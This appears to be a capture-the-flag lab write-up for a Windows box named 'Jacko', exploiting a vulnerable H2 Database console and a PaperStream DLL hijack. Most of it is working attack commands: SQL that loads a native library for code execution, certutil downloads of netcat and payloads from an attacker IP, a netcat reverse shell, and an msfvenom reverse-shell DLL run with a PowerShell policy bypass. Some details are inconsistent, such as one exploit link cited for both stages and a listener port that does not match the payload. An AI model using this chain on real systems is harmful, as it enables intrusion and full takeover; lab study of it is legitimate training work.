---
description: Elevated privileges using a DLL hijacking attack
---

# Jacko

## Summary

* A vulnerable version of H2 Database was hosted on the machine vulnerable to JNI Code Execution.
* Leveraged code injection to get a reverse shell on the box
* Using winPEAS, found DLL hijack vulnerability resulting in priv escalation in PaperStream service.
* Leraved this vulnerability to gain elevated shell on the box.

## Let's Unpack

### Enumeration

```bash
sudo nmap -sC -sN -A -oN nmapFull -p- -A 192.168.216.66
>

Nmap scan report for 192.168.216.66
Host is up (0.088s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: H2 Database Engine (redirect)
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
8082/tcp  open  http          H2 database http console
|_http-title: H2 Console
9092/tcp  open  XmlIpcRegSvc?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

An older version of H2 database was hosted on port 8082, which was vulnerable to JNI code injection.

### Initial Foothold

We can use the following exploit to get a reverse shell in the box.

{% embed url="https://www.exploit-db.com/exploits/49384" %}

```bash
# Write native library, copy from above link

# Load native library
CREATE ALIAS IF NOT EXISTS System_load FOR "java.lang.System.load";
CALL System_load('C:\Windows\Temp\JNIScriptEngine.dll');

# Execute Code Injection
CREATE ALIAS IF NOT EXISTS JNIScriptEngine_eval FOR "JNIScriptEngine.eval";
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("whoami").getInputStream()).useDelimiter("\\Z").next()');

# upload netcat
certutil -urlcache -f http://192.168.45.177:8000/nc64.exe C:/windows/Temp/nc64.exe

# Replace following payload with whoami to get a reverse shell
C:/windows/Temp/nc64.exe 192.168.45.177 4444 -e cmd

# Catch the reverse shell
nc -nlvp 4444

# Got first flag!
            
```

<details>

<summary>Got stuck here <span data-gb-custom-inline data-tag="emoji" data-code="1f625">😥</span></summary>

I was unable to upload the nc.exe on the same directory, on looking to the walkthrough, I understood that if payload cannot be saved in the same directory, then always save in C:\windows\Temp\nc.exe! Silly mistake I know :sweat\_smile:

</details>

### Privilege escalation

None of the cmd commands, like Whoami, systeminfo, etc., were usable. So, the cmd prompt was fixed by running the following command.

```powershell
# We must fix our PATH variable to execute some common commands.
set PATH=%SystemRoot%\system32;%SystemRoot%;
```

Using winPEAS, we found a vulnerable version of PaperStream installed in the system that can be used to gain elevated privileges using a DLL hijacking attack.

Exploit used -> [https://www.exploit-db.com/exploits/49384](https://www.exploit-db.com/exploits/49384)

```powershell
# created a malicious DLL using msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.177 LPORT=9999 -f dll > exploit.dll

# uploaded the DLL to the windows /temp directory
certutil -urlcache -f http://192.168.45.177:8000/exploit.dll C:/temp/exploit.dll

# uploaded the ps1 payload into the same directory
certutil -urlcache -f http://192.168.45.177:8000/exploit.ps1 C:/temp/exploit.ps1

# Executing the exploit
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -ep bypass 
C:\temp\exploit.ps1

# started a nc listener to catch the reverse shell with room priv
nc -nlvp 7777


# BOOM! Got the admin priv
```



















